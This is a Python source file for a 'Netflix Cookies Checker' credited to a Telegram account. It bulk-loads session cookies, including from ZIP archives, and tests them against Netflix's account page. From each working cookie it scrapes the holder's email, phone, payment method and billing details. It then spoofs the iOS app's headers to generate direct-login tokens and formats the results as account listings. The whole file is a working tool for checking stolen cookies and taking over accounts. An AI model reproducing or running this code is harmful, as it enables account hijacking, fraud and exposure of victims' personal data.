import os
import re
import json
import time
import requests
import zipfile
import urllib.parse
import codecs
import logging
import tempfile
import shutil
from datetime import datetime
import uuid

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Owner credit
OWNER_CREDIT = "t.me/czabcdb (TrongThao Tech)"

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def extract_cookies(content):
    """Extract Netflix cookies from various formats"""
    cookies = {}
    required = ["NetflixId", "SecureNetflixId", "nfvdid"]
    
    # 1. Try JSON format
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                name = cookie.get("name")
                if name in required:
                    cookies[name] = cookie.get("value")
        elif isinstance(data, dict):
            if any(k in data for k in required):
                for k in required:
                    if k in data: cookies[k] = data[k]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    name = cookie.get("name")
                    if name in required:
                        cookies[name] = cookie.get("value")
    except:
        pass
    
    if len(cookies) == len(required):
        return cookies

    # 2. Try Netscape and Raw formats for missing ones
    for name in required:
        if name in cookies: continue
        
        # Raw string pattern: Name=Value
        match = re.search(rf'(?<!\w){name}=([^;,\s]+)', content)
        if match:
            val = match.group(1)
            if '%' in val:
                try: val = urllib.parse.unquote(val)
                except: pass
            cookies[name] = val
            continue
            
        # Netscape pattern: .netflix.com TRUE / TRUE 12345 Name Value
        match = re.search(rf'\.netflix\.com\s+TRUE\s+/\s+(?:TRUE|FALSE)\s+\d+\s+{name}\s+([^\s]+)', content)
        if match:
            val = match.group(1)
            if '%' in val:
                try: val = urllib.parse.unquote(val)
                except: pass
            cookies[name] = val
            
    return cookies

def extract_netflix_id(content):
    """Legacy function for compatibility"""
    cookies = extract_cookies(content)
    return cookies.get("NetflixId")

def extract_profiles_from_manage_profiles(response_text):
    profiles = []
    try:      
        profiles_match = re.search(r'"profiles"\s*:\s*({[^}]+})', response_text)
        if profiles_match:
            profiles_json_str = profiles_match.group(1)                       
            def unescape_hex(match):
                hex_code = match.group(1)
                try:
                    return chr(int(hex_code, 16))
                except:
                    return match.group(0)
            cleaned_json = re.sub(r'\\x([0-9a-fA-F]{2})', unescape_hex, profiles_json_str)
            profiles_data = json.loads(f'{{{cleaned_json}}}')
            for profile_id, profile_data in profiles_data.items():
                if isinstance(profile_data, dict):
                    summary = profile_data.get('summary', {})
                    if isinstance(summary, dict):
                        value = summary.get('value', {})
                        if isinstance(value, dict):
                            profile_name = value.get('profileName')
                            if profile_name:
                                profiles.append(profile_name)
    except Exception:
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', response_text)
            for profile in profile_matches:
                profile = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), profile)
                profiles.append(profile)
        except:
            pass
    return profiles

def extract_next_billing_date(response_text):
    try:
        billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
        if billing_match:
            billing_data = billing_match.group(0)
            date_match = re.search(r'"date":\s*"([^"]+)"', billing_data)
            if date_match:
                return date_match.group(1)
        date_match = re.search(r'"nextBillingDate"[^}]+"date":\s*"([^"]+)"', response_text)
        if date_match:
            return date_match.group(1)
    except Exception as e:
        logger.error(f"Error extracting billing date: {e}")
    return "Unknown"

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        logger.info(f"Response status: {resp.status_code}")
        
        if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
            return {'ok': False, 'err': 'Invalid cookie (login page detected)', 'cookie': cookie_dict}
        
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False, 'err': 'Invalid cookie (not logged in)', 'cookie': cookie_dict}

        def find(pattern, text=txt):
            m = re.search(pattern, text)
            return m.group(1).strip() if m else None

        plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        if plan: plan = unescape_plan(plan)
        else: plan = "Unknown"

        plan_price = find(r'"planPrice"[^}]+"value":"([^"]+)"') or find(r'planPrice[^}]+value[^}]+"([^"]+)"')
        if plan_price: plan_price = unescape_plan(plan_price)
        else: plan_price = "Unknown"

        member_since = find(r'"memberSince":"([^"]+)"')
        if member_since: member_since = unescape_plan(member_since)
        else: member_since = "Unknown"

        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"') or "Unknown"

        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
        if phone: phone = phone.replace("\\x2B", "+")
        else: phone = "Unknown"

        phone_verified_match = re.search(r'"growthPhoneNumber"[^}]+"isVerified":(true|false)', txt)
        phone_verified = "Yes" if phone_verified_match and phone_verified_match.group(1) == 'true' else "No"

        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or "Unknown"
        max_streams = find(r'"maxStreams"[^}]+"value":(\d+)') or "Unknown"

        payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
        payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"

        extra_member_match = re.search(r'"showExtraMemberSection"[^}]+"value":(true|false)', txt)
        extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"

        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        if email and email != "Unknown":
            email = urllib.parse.unquote(email)
        
        next_billing = extract_next_billing_date(txt)

        profiles = []
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
            for profile in profile_matches:
                if profile and profile not in profiles:
                    profiles.append(profile)
        except Exception as e:
            logger.error(f"Error extracting profiles: {e}")
        
        profiles_str = ", ".join(profiles) if profiles else "Unknown"

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status_match)
        
        if not is_valid and "NetflixId" in cookie_dict:
            is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
            is_premium = is_valid

        logger.info(f"Account validation - Valid: {is_valid}, Premium: {is_premium}")

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'member_since': member_since,
            'payment_method': payment_method,
            'phone': phone,
            'phone_verified': phone_verified,
            'video_quality': video_quality,
            'max_streams': max_streams,
            'on_payment_hold': payment_hold,
            'extra_member': extra_member,
            'email_verified': email_verified,
            'email': email,
            'profiles': profiles_str,
            'next_billing': next_billing,
            'cookie': cookie_dict
        }
    except Exception as e:
        logger.error(f"Error checking Netflix cookie: {str(e)}")
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.context.top-level-uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.client.iosversion': "15.8.5",
        'accept-language': "en-US;q=1",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        data = response.json()
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            if len(str(expires)) == 13: expires //= 1000
            generation_time = int(time.time())
            time_remaining = expires - generation_time
            return {
                "status": "Success",
                "generation_time": generation_time,
                "expires": expires,
                "time_remaining": time_remaining,
                "token": token,
                "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"
            }
        else:
            return {"status": "Failure", "error": "No token found in response"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP file: {e}")
        return []

def format_account_details(account_data):
    """Format account data for text output"""
    content = "╔══════════════════════════════════════════╗\n"
    content += "║           NETFLIX ACCOUNT DETAILS         ║\n"
    content += "╚══════════════════════════════════════════╝\n\n"
    content += "📅 Generated: {}\n\n".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    content += "🔐 ACCOUNT STATUS\n"
    content += "├─ Status: {}\n".format("VALID" if account_data['ok'] else "INVALID")
    content += "├─ Premium: {}\n".format("YES" if account_data['premium'] else "NO")
    content += "└─ Country: {}\n\n".format(account_data['country'])
    
    content += "💳 SUBSCRIPTION DETAILS\n"
    content += "├─ Plan: {}\n".format(account_data['plan'])
    content += "├─ Price: {}\n".format(account_data['plan_price'])
    content += "├─ Member Since: {}\n".format(account_data['member_since'])
    content += "├─ Payment Method: {}\n".format(account_data['payment_method'])
    content += "└─ Next Billing: {}\n\n".format(account_data['next_billing'])
    
    content += "👤 PROFILE INFORMATION\n"
    content += "├─ Email: {}\n".format(account_data['email'].replace('\\x40', '@'))
    content += "├─ Email Verified: {}\n".format(account_data['email_verified'])
    content += "├─ Phone: {}\n".format(account_data['phone'])
    content += "├─ Phone Verified: {}\n".format(account_data['phone_verified'])
    content += "└─ Profiles: {}\n\n".format(account_data['profiles'])
    
    content += "⚙️ ACCOUNT FEATURES\n"
    content += "├─ Video Quality: {}\n".format(account_data['video_quality'])
    content += "├─ Max Streams: {}\n".format(account_data['max_streams'])
    content += "├─ Payment Hold: {}\n".format(account_data['on_payment_hold'])
    content += "└─ Extra Member: {}\n\n".format(account_data['extra_member'])
    
    content += "🍪 COOKIES\n"
    for k, v in account_data['cookie'].items():
        content += f"{k}={v}\n"
    content += "\n"
    
    if account_data.get('token_result', {}).get('status') == 'Success':
        token = account_data['token_result']
        content += "🔑 TOKEN INFORMATION\n"
        content += "├─ Status: {}\n".format(token['status'])
        content += "├─ Expiry: {}\n".format(datetime.fromtimestamp(token['expires']).strftime('%Y-%m-%d %H:%M:%S'))
        content += "└─ Login URL: {}\n\n".format(token['direct_login_url'])
    
    content += "━" * 45 + "\n"
    content += f"Generated by Netflix Cookies Checker\n"
    content += f"Owner: {OWNER_CREDIT}\n"
    content += "━" * 45 + "\n"
    return content
